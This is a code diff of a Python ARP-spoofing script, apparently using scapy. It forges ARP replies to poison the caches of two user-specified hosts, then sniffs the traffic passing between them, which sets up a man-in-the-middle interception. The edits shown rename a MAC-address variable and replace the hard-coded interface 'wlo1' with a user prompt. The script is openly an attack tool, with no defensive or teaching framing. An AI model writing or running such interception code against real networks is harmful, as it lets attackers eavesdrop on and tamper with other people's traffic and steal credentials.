@@ -5,10 +5,10 @@ def sendingarprequest():
         print("Posining MAC address in target 1 routing table....")
         ether1=Ether()
         ether1.dst=target1mac
-        ether1.src=YourMAC
+        ether1.src=YourMac
         arp1=ARP()
         arp1.psrc=target2
-        arp1.hwsrc=YourMAC
+        arp1.hwsrc=YourMac
         arp1.pdst=target1
         arp1.op=1
         frame=ether1/arp1
@@ -16,10 +16,10 @@ def sendingarprequest():
         print("Posining MAC address in target 2 routing table....")
         ether2=Ether()
         ether2.dst=target2mac
-        ether2.src=YourMAC
+        ether2.src=YourMac
         arp2=ARP()
         arp2.psrc=target1
-        arp2.hwsrc=YourMAC
+        arp2.hwsrc=YourMac
         arp2.pdst=target2
         arp2.op=1
         frame=ether2/arp2
@@ -127,7 +127,8 @@ target1 = input("Target 1 IP: ")
 target1mac= input("Target 1 MAC: ")
 target2=input("Target 2 IP: ")
 target2mac = input("Target 2 MAC: ")
-YourMAC=input("Your MAC for getting Packets: ")
+YourMac=input("Your MAC for getting Packets: ")
+iface = input("Network Interface you are using currently e.g. usb,wlo1,eth0: ")
 # for the sake of simiplicity
 #target1 = "192.168.43.246"
 #target2 = "192.168.43.136"
@@ -140,7 +141,7 @@ sendingarprequest()
 print("getting data.....")
 print("at waiting area....")
 #f="host target1"
-sniff(iface='wlo1',filter="(ip src "+target1+" and ip dst "+target2 + ") or "+"(ip src "+target2+" and ip dst "+target1 + ")",prn=spoof_packet)
+sniff(iface=iface,filter="(ip src "+target1+" and ip dst "+target2 + ") or "+"(ip src "+target2+" and ip dst "+target1 + ")",prn=spoof_packet)
 a= 0;
 print("packet capture %d"%(a))
 a =a +1
